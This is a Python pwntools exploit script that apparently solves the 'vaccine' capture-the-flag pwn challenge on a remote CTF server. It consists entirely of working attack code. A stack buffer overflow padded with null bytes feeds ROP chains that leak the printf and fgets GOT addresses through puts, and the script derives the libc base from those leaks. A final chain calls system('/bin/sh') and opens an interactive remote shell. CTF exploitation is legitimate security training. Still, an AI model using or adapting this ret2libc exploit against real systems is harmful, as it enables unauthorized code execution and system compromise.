#!/usr/bin/env python3
from pwn import *

exe = ELF("./vaccine_patched")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-2.31.so", False)

context.binary = exe

#p = process("./vaccine_patched")
#gdb.attach(p)
p = remote("vaccine.chal.ctf.acsc.asia", 1337)

context.binary = exe

pop_rdi = 0x401443
ret = 0x40101a

get_to_ret = b"A"*4 + b"\x00" + b"A"*111 + b"\x00" + b"B"*147

payload = get_to_ret
payload += p64(pop_rdi)
payload += p64(exe.got["printf"])
payload += p64(exe.plt["puts"])
payload += p64(exe.sym["main"])

p.recvuntil(b"vaccine:")
p.sendline(payload)

p.recvline()
p.recvline()

recieved = p.recvline().strip()
leak_printf = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address, printf: "+ str(hex(leak_printf)))

payload = get_to_ret
payload += p64(pop_rdi)
payload += p64(exe.got["fgets"])
payload += p64(exe.plt["puts"])
payload += p64(exe.sym["main"])

p.recvuntil(b"vaccine:")
p.sendline(payload)

p.recvline()
p.recvline()

recieved = p.recvline().strip()
leak_fgets = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address, fgets: "+ str(hex(leak_fgets)))

libc.address = leak_fgets - libc.symbols["fgets"] # save libc base

log.info("libc leak: " + str(hex(libc.address)))

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

second_payload = get_to_ret
second_payload += p64(pop_rdi)
second_payload += p64(binsh)
second_payload += p64(ret)
second_payload += p64(libc_system)
second_payload += p64(libc_exit)

p.sendline(second_payload)

p.interactive()
